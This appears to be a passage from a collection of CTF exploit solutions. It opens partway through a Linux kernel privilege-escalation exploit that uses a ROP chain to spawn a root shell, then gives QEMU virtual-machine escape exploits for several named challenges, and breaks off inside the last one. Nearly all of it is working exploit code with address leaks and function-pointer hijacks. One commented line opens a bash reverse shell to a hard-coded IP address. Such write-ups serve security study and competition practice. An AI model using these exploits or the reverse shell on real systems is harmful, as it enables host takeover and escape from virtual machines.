size_t init_cred = 0xffffffff81e48080;
size_t swapgs_restore_regs_and_return_to_usermode = 0;
size_t pop_rdi_ret = 0xffffffff811f7cfd;
size_t swapgs_pop_rbp_ret = 0xffffffff810645e4;
size_t iretq = 0xffffffff81133e15;
size_t kernel_offset;
int fd;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved. \n");
}

void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("[*] Process binded to core %d\n", core);
}

void get_shell(){
    if(getuid()){
        printf("[x] Failed to get the root!\n");
        exit(-1);
    }
    system("/bin/sh");
    exit(0);
}

void err_exit(char * msg)
{
    printf("[x] Error at: %s\n", msg);
    exit(EXIT_FAILURE);
}

void join(){
    write(fd, "/cmd join", 9);
}

void leave(){
    write(fd, "/cmd leave", 10);
}

void list(){
    write(fd, "/cmd list", 9);
}

int main(){
    char *buf; 
    save_status();
    bind_core(0);
    fd = open("/dev/chatroom", O_RDWR);
    if(fd < 0){
        err_exit("Failed to open dev!");
    }
    join();

    buf = malloc(0x1000);
    pid_t pid = fork();
    if(pid == 0){
        memset(buf, 'a', 0x430);
        write(fd, buf, 0x430);
    }

    wait(NULL);
    system("dmesg | grep 'RCX' | awk '{print $8}' > /tmp/leak");
    int leak_fd = open("/tmp/leak", O_RDWR);
    if(leak_fd < 0){
        err_exit("Failed to open leak");
    }
    char leak_buf[16];
    read(leak_fd, leak_buf, 0x10);
    kernel_offset = strtoul(leak_buf, NULL, 0x10) - 0xffffffff81e4f698;
    printf("kernel_offset_is %lx\n", kernel_offset);
    
    int i = 0x84;
    ((size_t*)buf)[i++] = 0;
    ((size_t*)buf)[i++] = pop_rdi_ret + kernel_offset;
    ((size_t*)buf)[i++] = init_cred + kernel_offset;
    ((size_t*)buf)[i++] = commit_creds + kernel_offset;
    ((size_t*)buf)[i++] = swapgs_pop_rbp_ret + kernel_offset;
    ((size_t*)buf)[i++] = 0;
    ((size_t*)buf)[i++] = iretq + kernel_offset;
    ((size_t*)buf)[i++] = (size_t)get_shell;
    ((size_t*)buf)[i++] = user_cs;
    ((size_t*)buf)[i++] = user_rflags;
    ((size_t*)buf)[i++] = user_sp;
    ((size_t*)buf)[i++] = user_ss;
    write(fd, buf, 0x500);

}
```





### qemu逃逸



##### pipeline

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>

void * mmio;
int port_base = 0xc040;

void pmio_write(int port, int val){ 
    outl(val, port_base + port); 
}

void mmio_write(uint64_t addr, char value){ 
    *(char *)(mmio + addr) = value;
}

int  pmio_read(int port) { 
    return inl(port_base + port); 
}

char mmio_read(uint64_t addr){ 
    return *(char *)(mmio + addr); 
}

void read_io(int idx, int size, int offset, char *data){
    pmio_write(0, idx);
    for(int i = 0; i < size; i++) { 
        data[i] = mmio_read(i + offset);
    }
}

void write_io(int idx, int size, int offset, char * data){
    pmio_write(0,idx); 
    pmio_write(4,size);
    for(int i=0; i< strlen(data); i++) { 
        mmio_write(i+offset, data[i]); 
    }
}


int main(){
    // init mmio and pmio
    iopl(3);
    int  mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    mmio         = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);

    char data[100];
    memset(data,0,100);
    memset(data,'/',87);
    write_io(2, 0x5c, 0, data);
    pmio_write(16,0);

    char leak[8];
    read_io(7, 8, 0x44, leak);
    printf("leak_addr_is 0x%lx\n", *((size_t*)leak));
    size_t elf_base = *((size_t*)leak) - 0x3404f3;
    size_t system = elf_base + 0x2c0ad0;
    printf("elf_base_is 0x%lx\n", elf_base);

    write_io(7, 0xff, 0x44, &system);
    char cmd[0x10] = "cat /flag";
    write_io(5, 0x10, 0, cmd);
    pmio_write(12, 0);
    // for(int i = 0; i < 8; ++i)
    //     mmio_write(0x44 + i, (char*)(system) + i);
    return 0;
}
```



##### 2021D3CTF d3dev

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>


void * mmio;
int port_base = 0xc040;


uint64_t mmio_read(uint64_t addr){
    return *((uint64_t*)(mmio + addr)) ;
}

void mmio_write(uint64_t addr, uint32_t value){ 
    *((uint32_t *)(mmio + addr)) = value;
}

int pmio_read(int port) { 
    return inl(port_base + port); 
}

void pmio_write(int port, int val){ 
    outl(val, port_base + port); 
}

size_t decode(uint32_t high, uint32_t low){
    uint64_t h = high;
    uint32_t l = low;
    unsigned int i = 0;
    do{
        i -= 0x61C88647;
        l += (i + h) ^ (((unsigned int)h) >> 5) ^ (16 * h);
        h += (i + l) ^ (l >> 5) ^ (16 * l);
        h = h & 0xffffffff;
        //low += (i + high) ^ (high >> 5) ^ (16 * high);
        //high += (i + low) ^ (low >> 5) ^ (16 * low);
        
    } while (i != 0xC6EF3720);
    
    //return ((size_t)high << 32) + low;
    return (h << 32) + l;
}

size_t encode(uint32_t high, uint32_t low){
    unsigned int i = 0xC6EF3720;
    do{
        high -= (i + low) ^ (low >> 5) ^ (16 * low);
        low -= (i + high) ^ (high >> 5) ^ (16 * high);
        i += 0x61C88647;
        
    } while (i);
    return ((size_t)high << 32) + low;
}


int main(){
    iopl(3);
    int  mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    mmio         = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    pmio_write(4, 0);
    pmio_write(8, 0x100);
    //high addr
    //uint64_t leak1 = mmio_read(0x18);
    //printf("leak1_is %lx\n", leak1);
    //low addr
    //uint64_t leak2 = mmio_read(0x18);
    //printf("leak1_is %lx\n", leak2);
    uint64_t leak1 = mmio_read(0x18);
    size_t leak_addr = decode((leak1 >> 32), (leak1 & 0xffffffff));
    printf("leak_addr_is %lx\n", leak_addr);
    size_t system = leak_addr - 0x47d30 + 0x52290;

    size_t en_system = encode((system >> 32), (system & 0xffffffff));
    printf("en_system_is %lx\n", en_system);

    mmio_write(0x18, (en_system & 0xffffffff));
    mmio_write(0x18, (en_system >> 32));

    char cmd2[4] = "flag";
    char cmd1[4] = "cat ";
    pmio_write(8, 0);
    mmio_write(0, *((uint32_t*)cmd2));
    pmio_write(0x1c, *((uint32_t*)cmd1));

    return 0;

}
```



##### 2019数字经济众测qemu

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>

void* mmio;

int mmio_read(uint64_t addr){
    return *((int*)(mmio + addr));
}

void mmio_write(uint32_t idx, uint32_t result, uint32_t val){
    uint64_t addr = ((result << 20) | (idx << 16));
    *((uint64_t*)(mmio + addr)) = val;
}

void mmio_write1(uint32_t idx, uint32_t result, uint32_t n ,uint32_t val){
    uint64_t addr = ((result << 20) | (idx << 16));
    addr += n;
    //printf("%lx ,%x\n",addr, val);
    *((uint64_t*)(mmio + addr)) = val;
}

int main(){
    // init mmio and pmio
    // iopl(3);
    int  mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    mmio         = mmap(0, 0x1000000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd,0);
    mmio_write(0, 0, 0);
    mmio_write(1, 0, 0);
    mmio_write(2, 1, 0);
    mmio_write(3, 1, 0);
    mmio_write(4, 2, 0);
    mmio_write(5, 3, 0);
    mmio_write(6, 2, 0);
    mmio_write(7, 3, 0);
    mmio_write(8, 5, 0);
    mmio_write(9, 4, 0);
    mmio_write(10, 5, 0);
    mmio_write(11, 4, 0);
    char cmd[8] = "cat flag";
    mmio_write1(0, 6, 0, *((uint32_t*)cmd));
    mmio_write1(0, 6, 4, *((uint32_t*)(cmd + 4)));
    mmio_read(0);
    return 0;
}
```



##### 2017HITB babyqemu

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <assert.h>
#include <inttypes.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

void * mmio;

int fd;
// 获取页内偏移
uint32_t page_offset(uint32_t addr)
{
    // addr & 0xfff
    return addr & ((1 << PAGE_SHIFT) - 1);
}
 
uint64_t gva_to_gfn(void *addr)
{
    uint64_t pme, gfn;
    size_t offset;
 
    //printf("pfn_item_offset : %p\n", (uintptr_t)addr >> 9);
    offset = ((uintptr_t)addr >> 9) & ~7;
 
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);

    if (!(pme & PFN_PRESENT))
        return -1;

    gfn = pme & PFN_PFN;
    return gfn;
}
 
uint64_t gva_to_gpa(void *addr)
{
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}
 
void mmio_write(uint64_t addr, uint32_t value){ 
    *(uint64_t *)(mmio + addr) = value;
}

uint64_t mmio_read(uint64_t addr){ 
    return *(uint64_t *)(mmio + addr); 
}


void dma_read(uint64_t src, uint64_t dst, uint32_t len){
    //set src
    mmio_write(0x80, src & 0xffffffff);
    mmio_write(0x84, src >> 32);
    //set dst
    mmio_write(0x88, dst & 0xffffffff);
    mmio_write(0x8c, dst >> 32);
    //set cnt
    mmio_write(0x90, len);
    //set cmd
    mmio_write(0x98, 1|2);
    sleep(1);
}

void dma_write(uint64_t src, uint64_t dst, uint32_t len){
    //set src
    mmio_write(0x80, src & 0xffffffff);
    mmio_write(0x84, src >> 32);
    //set dst
    mmio_write(0x88, dst & 0xffffffff);
    mmio_write(0x8c, dst >> 32);
    //set cnt
    mmio_write(0x90, len);
    //set cmd
    mmio_write(0x98, 1);
    sleep(1);
}

void dma_en(uint64_t src, uint64_t dst, uint32_t len){
    //set src
    mmio_write(0x80, src & 0xffffffff);
    mmio_write(0x84, src >> 32);
    //set dst
    mmio_write(0x88, dst & 0xffffffff);
    mmio_write(0x8c, dst >> 32);
    //set cnt
    mmio_write(0x90, len);
    //set cmd
    mmio_write(0x98, 1|2|4);
}

size_t buf[2];

int main()
{
    uint64_t ptr_mem;
    fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open");
        exit(1);
    }
    int  mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    mmio         = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    ptr_mem = gva_to_gpa(buf);

    dma_read(0x40000 + 0x1000, ptr_mem, 8);
    printf("leak_addr_is %lx\n", buf[0]);
    size_t elf_base = buf[0] - 0x283dd0;
    size_t system_plt = elf_base + 0x1fdb18;
    
    buf[0] = system_plt;
    dma_write(ptr_mem, 0x40000 + 0x1000, 8);
    
    char cmd[0x10] = "cat /flag";
    //buf[0] = *((size_t*)cmd);
    //char cmd[0x10] = "gnome-calculator";
    buf[0] = *((size_t*)cmd);
    buf[1] = ((size_t*)cmd)[1];
    //buf[1] = *((size_t*)(cmd + 8));
    //printf("%lx\n", buf[1]);
    dma_write(ptr_mem, 0x40000, 16);

    dma_en(0x40000, 0, 0);
    return 0;
}
```



##### V&N2023 escape_langlang_mountain



```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>

void* mmio;

uint32_t mmio_read(uint64_t addr){
    return *((uint32_t*)(mmio + addr));
}

void mmio_write(uint64_t addr){
    *((uint64_t*)(mmio + addr)) = 0;
}

int main(){
    // init mmio and pmio
    // iopl(3);
    int  mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    mmio         = mmap(0, 0x1000000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd,0);

    mmio_read((1 << 20)|(15 << 16));
    mmio_write((1 << 20));
    mmio_write((2 << 20)|(15 << 16));

}
```



#####  2021 HWS FastCP

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <assert.h>
#include <inttypes.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

void * mmio;

int fd;

typedef struct
{
    uint64_t src;
    uint64_t cnt;
    uint64_t dst;
}cp_info;


// 获取页内偏移
uint32_t page_offset(uint32_t addr)
{
    // addr & 0xfff
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr)
{
    uint64_t pme, gfn;
    size_t offset;
    fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open");
        exit(1);
    }
    //printf("pfn_item_offset : %p\n", (uintptr_t)addr >> 9);
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;

    gfn = pme & PFN_PFN;
    return gfn;
}

uint64_t gva_to_gpa(void *addr)
{
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}


void mmio_write(uint64_t addr, uint64_t value){ 
    *(uint64_t *)(mmio + addr) = value;
}

uint64_t mmio_read(uint64_t addr){ 
    return *(uint64_t *)(mmio + addr); 
}

void dma_op(uint64_t src, uint64_t cnt, uint64_t cmd){
    mmio_write(8, src);
    mmio_write(16, cnt);
    mmio_write(24, cmd);
    sleep(1);
}

cp_info cp[0x20];

char *buf;
int main(){
    uint64_t ptr_mem, ptr_buf;
    
    int  mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    mmio         = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);

    ptr_mem = gva_to_gpa(&cp);
    system("sysctl vm.nr_hugepages=30");
    buf = mmap(0, 0x200000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | 0x40000, -1, 0);
    memset(buf, 'a', 0x2000);
    buf = mmap(0, 0x200000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | 0x40000, -1, 0);
    memset(buf, 'a', 0x2000);

    ptr_buf = gva_to_gpa(buf);
    cp[0].dst = ptr_buf;
    cp[0].src = 0;
    cp[0].cnt = 0x1030;

    dma_op(ptr_mem, 1, 4);
    size_t elf_base = *(size_t*)(buf + 0x1010) - 0x4DCE80;
    size_t system_plt = elf_base + 0x2c2180;
    size_t opaque = *(size_t*)(buf + 0x1018);
    size_t opaque_buf = opaque + 0xa00;
    printf("elf_base_is %lx\n", elf_base);
    printf("opaque_addr_is %lx\n", opaque);


    *(size_t*)(buf + 0x1010) = system_plt;
    *(size_t*)(buf + 0x1018) = opaque_buf;
    char cmd[0x20] = "gnome-calculator";
    //char cmd[0x40] = "/bin/bash -c \'bash -i >& /dev/tcp/192.168.184.142/8888 0>&1\'";
    memcpy(buf, cmd, 0x20);

    for(int i = 0; i < 0x11; ++i){
        cp[i].cnt = 0x1030;
        cp[i].dst = ptr_buf;
        cp[i].src = ptr_buf;
    }
    dma_op(ptr_mem, 0x11, 1);
    dma_op(ptr_mem, 0, 0);


}
```



##### rwctf2021Easy_Escape



```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <assert.h>
#include <inttypes.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>

#define DEVICE_ADDR 0x00000000febf1000

void * mmio;

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

uint32_t page_offset(uint32_t addr)
{
    // addr & 0xfff
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr)
{
    uint64_t pme, gfn;
    size_t offset;
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open");
        exit(1);
    }
    //printf("pfn_item_offset : %p\n", (uintptr_t)addr >> 9);
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;

    gfn = pme & PFN_PFN;
    close(fd);
    return gfn;
}

uint64_t gva_to_gpa(void *addr)
{
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

void mmio_write(uint64_t addr, uint32_t value){ 
    *(uint32_t *)(mmio + addr) = value;
}

uint32_t mmio_read(uint64_t addr){ 
    return *(uint32_t *)(mmio + addr); 
}

void write_req(uint32_t idx, uint32_t addr, uint32_t result_addr){
    addr -= (idx << 10);
    mmio_write(0xc, idx);
    mmio_write(4, addr);
    mmio_write(8, result_addr);
    mmio_write(0x10, 0);
}

void read_req(uint32_t idx, uint32_t addr, uint32_t result_addr){
    addr -= (idx << 10);
    mmio_write(0xc, idx);
    mmio_write(4, addr);
    mmio_write(8, result_addr);
    mmio_read(0x10);
}

void create_req(uint32_t num){
    uint32_t size = (num - 1) << 10;
    mmio_write(0, size);
    mmio_write(0x14, 0);
}

void delete_req(){
    mmio_write(0x18, 0);
}


char buf[0x1000];
size_t tcache_addr[0x10];
char cmd[0x40] = "gnome-calculator";

int main(){
    uint32_t pem_buf;
    size_t the_thread_arena, next_thread_arena, main_arena;
    size_t libc_base;
    size_t req_addr;
    int  mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    mmio         = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    
    pem_buf = gva_to_gpa(buf);

    // leak tcache addr;
    create_req(5);
    delete_req();
    create_req(5);
    for(int i = 0; i < 5; ++i){
        read_req(i, pem_buf, 0);
        tcache_addr[i] = *(size_t*)buf;
        //printf("%lx\n", tcache_addr[i]);
        if(tcache_addr[i] != 0){
            the_thread_arena = (tcache_addr[i] >> 24) << 24;
        }
    }
    req_addr = tcache_addr[3] - 0x410;
    printf("leak_thread_arena_is %lx\n", the_thread_arena);
    printf("leak_req_addr_is %lx\n", req_addr);
    delete_req();

    // uaf
    create_req(3);
    *(size_t*)buf = req_addr;
    *(size_t*)(buf + 8) = 0;
    write_req(1, pem_buf, DEVICE_ADDR + 0x18);
    create_req(3);

    // leak next thread arena
    ((size_t*)buf)[0] = 0x800;
    ((size_t*)buf)[1] = the_thread_arena + 0x890;
    ((size_t*)buf)[2] = req_addr;
    ((size_t*)buf)[3] = req_addr;
    write_req(2, pem_buf, 0);
    read_req(0, pem_buf, 0);
    next_thread_arena = *(size_t*)buf - 0x20;
    if(next_thread_arena & 0xfff){
        puts("req_addr_is_fail");
        exit(-1);
    }
    printf("next_thread_arena_is %lx\n", next_thread_arena);

    // leak main arena
    ((size_t*)buf)[0] = 0x800;
    ((size_t*)buf)[1] = next_thread_arena + 0x890;
    ((size_t*)buf)[2] = req_addr;
    ((size_t*)buf)[3] = req_addr;
    write_req(2, pem_buf, 0);
    read_req(0, pem_buf, 0);
    main_arena = *(size_t*)buf;
    libc_base = main_arena - 0x1ecb80;
    printf("main_arena_is %lx\n", main_arena);
    printf("libc_base_is %lx\n", libc_base);

    // hijack __free_hook and get shell
    size_t free_hook = libc_base + 0x1eee48;
    size_t sys_addr = libc_base + 0x52290;
    ((size_t*)buf)[0] = 0x800;
    ((size_t*)buf)[1] = tcache_addr[0];
    ((size_t*)buf)[2] = free_hook;
    ((size_t*)buf)[3] = req_addr;
    write_req(2, pem_buf, 0);
    *(size_t*)buf = sys_addr;
    write_req(1, pem_buf, 0);
    memcpy(buf, cmd, 0x40);
    write_req(0, pem_buf, 0);
    delete_req();
    return 0;
}
```



##### qwb2021 EzQtest

```python
from pwn import*
p = process('./qemu-system-x86_64  -display  none -machine  accel=qtest -m  512M -device  qwb -nodefaults -monitor  none -qtest  stdio'.split())
#p = process('./qemu-system-x86_64  -display  none -machine  accel=qtest -m  512M -device  qwb -nodefaults -monitor telnet:127.0.0.1:4444,server,nowait -qtest  stdio'.split())
context.log_level = 'debug'
context.arch = 'amd64'

p.sendline(b'outl 3320 ' + str(0x80001010).encode())
p.sendline(b'outl 3324 ' + str(0xfebc0000).encode())
p.sendline(b'outl 3320 ' + str(0x80001004).encode())
p.sendline(b'outw 3324 ' + str(0x107).encode())

base = 0xfeb00000
def write_dma_info_size(val):
    p.sendline('writeq {} {}'.format(str(base), str(val)).encode())
    p.recvuntil(b'OK\n')

def write_dma_info_idx(val):
    p.sendline('writeq {} {}'.format(str(base + 8), str(val)).encode())
    p.recvuntil(b'OK\n')

def write_src(val):
    p.sendline('writeq {} {}'.format(str(base + 0x10), str(val)).encode())
    p.recvuntil(b'OK\n')

def write_dst(val):
    p.sendline('writeq {} {}'.format(str(base + 0x18), str(val)).encode())
    p.recvuntil(b'OK\n')

def write_cnt(val):
    p.sendline('writeq {} {}'.format(str(base + 0x20), str(val)).encode())
    p.recvuntil(b'OK\n')

def write_cmd(val):
    p.sendline('writeq {} {}'.format(str(base + 0x28), str(val)).encode())
    p.recvuntil(b'OK\n')

def read_src():
    p.sendline('readq {}'.format(str(base + 0x10)).encode())
    p.recvuntil(b'OK 0x')
    return int(p.recv(16), 16)

def read_dst():
    p.sendline('readq {}'.format(str(base + 0x18)).encode())
    p.recvuntil(b'OK 0x')
    return int(p.recv(16), 16)

def qwb_do_dma():
    p.sendline('readq {}'.format(str(base + 0x30)).encode())
    p.recvuntil(b'OK\n')

def b64write(addr, val):
    val = b64e(val)
    p.sendline('b64write {} {} {}'.format(str(addr), str(len(val)), val).encode())
    p.recvuntil(b'OK\n')

def b64read(addr, size):
    p.sendline('b64read {} {}'.format(str(addr), str(size)).encode())

write_dma_info_size(0x20)
fake_addr = 0x40000
#leak elf_base heap_addr
faker_dma_state = p64((1 << 64) - 0xe00)
faker_dma_state += p64(fake_addr)
faker_dma_state += p64(0x1000)
faker_dma_state += p64(1)
b64write(fake_addr, faker_dma_state)

write_dma_info_idx(0)
write_src(fake_addr)
write_dst((1 << 64) - 0x20)
write_cnt(0x20)
write_cmd(0)
qwb_do_dma()

b64read(fake_addr, 0x10)
p.recvuntil(b'OK ')
p.recvuntil(b'OK ')
p.recvuntil(b'OK ')
t = p.recvuntil(b'\n', drop=True)
leak = b64d(t)
heap_addr = u64(leak[:8]) - 0x29e790
elf_base = u64(leak[8:]) - 0x2d4ec0

#leak libc_base
QWBState = heap_addr + 0xf2b6b0
QWBState_buf_addr = heap_addr + 0xf2b6b0 + 0xe00
write_got = elf_base + 0x11119f8
faker_dma_state = p64((1 << 64) + (write_got - QWBState_buf_addr))
faker_dma_state += p64(fake_addr)
faker_dma_state += p64(8)
faker_dma_state += p64(1)
b64write(fake_addr, faker_dma_state)

write_dma_info_idx(0)
write_src(fake_addr)
write_dst((1 << 64) - 0x20)
write_cnt(0x20)
write_cmd(0)

write_dma_info_idx(0x1f)
write_src(0)
write_dst(0)
write_cnt(0)
write_cmd(0)

qwb_do_dma()
b64read(fake_addr, 8)
p.recvuntil(b'OK ')
p.recvuntil(b'OK ')
p.recvuntil(b'OK ')
t = p.recvuntil(b'\n', drop=True)
libc_base = u64(b64d(t)) - 0x2052e0

#hijack pci_default_read_config
gadget1 = elf_base + 0x3d2f05
gadget2 = libc_base + 0x148d9e
b64write(fake_addr + 0x1000, p64(gadget1) + p64(gadget2))

faker_dma_state = p64(fake_addr + 0x1000)
faker_dma_state += p64((1 << 64) - 0xe00 + 0x20)
faker_dma_state += p64(8)
faker_dma_state += p64(0)
b64write(fake_addr, faker_dma_state)

faker_dma_state = p64(fake_addr + 0x1008)
faker_dma_state += p64((1 << 64) - 0xe00 + 0x460)
faker_dma_state += p64(8)
faker_dma_state += p64(0)
b64write(fake_addr + 0x20, faker_dma_state)

write_dma_info_idx(0)
write_src(fake_addr)
write_dst((1 << 64) - 0x40)
write_cnt(0x40)
write_cmd(0)

write_dma_info_idx(0x1f)
write_src(0)
write_dst(0)
write_cnt(0)
write_cmd(0)

qwb_do_dma()
p.sendline(b'inw 3324')

p.interactive()
```



##### hfctf2022 hfdev

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <assert.h>
#include <inttypes.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>
#include <unistd.h>

int port_base = 0xc040;

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

uint32_t page_offset(uint32_t addr)
{
    // addr & 0xfff
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr)
{
    uint64_t pme, gfn;
    size_t offset;
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open");
        exit(1);
    }
    //printf("pfn_item_offset : %p\n", (uintptr_t)addr >> 9);
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;

    gfn = pme & PFN_PFN;
    close(fd);
    return gfn;
}

uint64_t gva_to_gpa(void *addr)
{
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}


uint32_t pmio_read(uint32_t port){
    return inw(port_base + port); 
}

void pmio_write(uint32_t port, uint64_t value){
    outw(value, port_base + port); 
}

void write_addr(size_t addr){
    pmio_write(2, addr);
    pmio_write(4, addr >> 16);
}

void write_size(size_t size){
    pmio_write(6, size);
}

void write_time(size_t value){
    pmio_write(10, value);
}

void exec_bh(){
    pmio_write(12, 0);
}


char buf[0x1000];

void set_read(uint64_t p_addr, uint16_t size){
    *((uint8_t*)(buf)) = 0x20;
    *((uint64_t*)(buf + 1)) = p_addr;
    *((uint16_t*)(buf + 9)) = size;
}

void set_exec_time(uint16_t size, uint16_t offset){
    *((uint8_t*)(buf)) = 0x30;
    *((uint16_t*)(buf + 1)) = size;
    *((uint16_t*)(buf + 3)) = offset;
}

void set_encode1(uint8_t add_byte, uint8_t xor_byte, uint16_t size){
    *((uint8_t*)(buf)) = 0x10;
    *((uint8_t*)(buf + 1)) = add_byte;
    *((uint8_t*)(buf + 2)) = xor_byte;
    *((uint16_t*)(buf + 3)) = 0x2202;
    *((uint16_t*)(buf + 5)) = size;
}

void set_encode2(uint16_t size){
    *((uint8_t*)(buf)) = 0x10;
    *((uint16_t*)(buf + 3)) = 0x2022;
    *((uint16_t*)(buf + 5)) = size;
}

int main(){
    size_t pem_buf;
    size_t heap_addr;
    size_t elf_base;
    iopl(3);

    // leak heap_addr
    puts("STEP-1. leak heap_addr");
    pem_buf = gva_to_gpa(buf);
    write_addr(pem_buf);
    write_size(0x400);
    set_encode1(0, 0, 0x200);
    exec_bh();
    sleep(0.3);
    set_exec_time(0x100, 0);
    exec_bh();
    sleep(0.3);
    set_encode2(0x300);   
    *((uint8_t*)(buf + 7 + 0x300)) = 1;
    exec_bh();
    sleep(0.3);

    set_exec_time(0x10, 0x10);
    exec_bh();
    sleep(0.3);
    set_exec_time(0, 0);
    exec_bh();
    sleep(0.3);
    set_read(pem_buf, 0x310);
    exec_bh();
    sleep(0.3);
    heap_addr = *((size_t*)(buf + 0x308));
    printf("leak_heap_addr_is %#lx\n", heap_addr);
    size_t hfdev_addr = heap_addr - 2696;
    size_t time_struct = hfdev_addr + 0x1d40;
    size_t bh_struct = hfdev_addr - 0x101a80;
    printf("time_struct_addr_is %#lx\n", time_struct);
    printf("bh_struct_addr_is %#lx\n", bh_struct);
    

    //leak elf_base
    puts("STEP-2. leak qemu elf_addr");
    memset(buf, 0, 0x400);
    set_encode2(0x300);
    *((uint8_t*)(buf + 7 + 0x300)) = 1;
    exec_bh();
    sleep(0.3);
    set_exec_time(0x10, 0x10);
    *((size_t*)(buf + 0x10)) = time_struct;
    *((size_t*)(buf + 0x18)) = bh_struct;
    exec_bh();
    sleep(0.3);
    set_encode2(0x300);
    exec_bh();
    sleep(0.3);

    write_time(8);
    set_exec_time(0x18, 0);
    exec_bh();
    sleep(0.3);
    set_encode2(0x310);
    *((uint64_t*)(buf + 7 + 0x308)) = heap_addr ^ time_struct;
    exec_bh();
    sleep(1);
    set_read(pem_buf, 0x338);
    exec_bh();
    sleep(0.3);
    size_t leak_addr = *((size_t*)(buf + 0x330));
    printf("leak_addr_is %#lx\n", leak_addr);
    elf_base = leak_addr - 0x381190;
    size_t system_plt = elf_base + 0x2D6610;
    printf("qemu_elf_base_is %#lx\n", elf_base);

    puts("STEP-3. hijack time_struct");
    memset(buf, 0, 0x400);
    size_t faker_time_struct_addr = heap_addr + 0x108;
    size_t cmd_addr = faker_time_struct_addr + 0x40;
    size_t faker_time_struct[8];
    char cmd[0x40] = "gnome-calculator";
